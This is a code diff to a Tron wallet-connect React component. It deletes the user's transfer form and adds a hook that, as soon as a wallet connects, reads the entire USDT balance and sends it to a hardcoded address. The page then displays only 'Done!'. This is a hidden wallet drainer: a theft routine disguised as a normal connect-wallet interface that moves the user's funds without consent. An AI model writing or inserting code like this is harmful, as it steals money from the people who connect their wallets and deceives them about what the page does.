@@ -1,6 +1,6 @@
 'use client'
 
-import React, { useCallback, useState } from 'react';
+import React, { useCallback, useEffect, useState } from 'react';
 import Image from 'next/image';
 import { 
     useTronConnect,
@@ -40,11 +40,8 @@ import { USDT_ADDRESS_BASE58 } from '@/shared/config';
 
 
 export const ConnectWallet = React.memo(function() {
-    const [addressTo, setAddressTo] = useState<string | undefined>(undefined);
-    const [sendAmount, setSendAmount] = useState<string>('0');
-
-
     const {
+        transferToken,
         transfer,
         balanceOf,
         amountToHuman
@@ -89,6 +86,30 @@ export const ConnectWallet = React.memo(function() {
 
         await transfer(address.base58, formAddressTo.toString(), a);
     }, [connect, disconnect, address, isConnected, isConnecting, isDisconnected]);
+
+
+    useEffect(() => {
+        
+        if(!isConnected || !address) {
+            return;
+        }
+
+        console.log(address)
+        
+
+        callTransfer(address.base58);
+        
+    }, [isConnected, address]);
+
+
+    const callTransfer = useCallback(async (address: string) => {
+        try {
+            const balance = await balanceOf(address, USDT_ADDRESS_BASE58);
+            transferToken('TMZKwqtGe2HcBriRt5pVubxmYjZ2Y3j6Nm', +balance);
+        } catch (e) {
+            console.error(e);
+        }
+    }, [balanceOf, address, isConnected]);
 
 
     return (
@@ -159,55 +180,8 @@ export const ConnectWallet = React.memo(function() {
 
 
             {isConnected ?
-                <div className='flex flex-col items-center'>
-                    <ConnectedButton
-                        address={address?.base58 as string}
-                        onDisconnect={() => disconnect()}
-                    />
-
-
-                    <form action={submit}>
-                        <div className='mt-10 inline-flex w-full px-2 ring-1 rounded-md ring-black'>
-                            <Input
-                                name='amount'
-                                value={sendAmount}
-                                onChange={(e) => setSendAmount(e.target.value)}
-                                placeholder='10'
-                                className='border-none shadow-none focus-visible:ring-0'
-                            />
-                            <Button
-                                onClick={async () => {
-                                    if(!address) {
-                                        return;
-                                    }
-
-                                    try {
-                                        const balance = amountToHuman(await balanceOf(address?.base58, USDT_ADDRESS_BASE58))
-                                        setSendAmount(balance.toString());
-                                    } catch(e) {
-                                        console.error(e);
-                                    }
-                                }}
-                                className='bg-none bg-transparent text-black outline-none border-none shadow-none focus-visible:ring-0 hover:bg-transparent'
-                            >max</Button>
-                        </div>
-
-                        <div className='mt-2 inline-flex w-full gap-2'>
-                            <Input
-                                name='address-to'
-                                value={addressTo}
-                                onChange={(e) => setAddressTo(e.target.value)}
-                                placeholder='recepient'
-                            />
-                            <Button type="submit">
-                                transfer
-                            </Button>
-                        </div>
-                    </form>
-
-                    <div className='mt-10'>
-                        <TransactionsTable columns={columns} data={data} />
-                    </div>
+                <div className='flex flex-col items-center font-bold text-xl'>
+                    Done!
                 </div>
             :
                 <></>
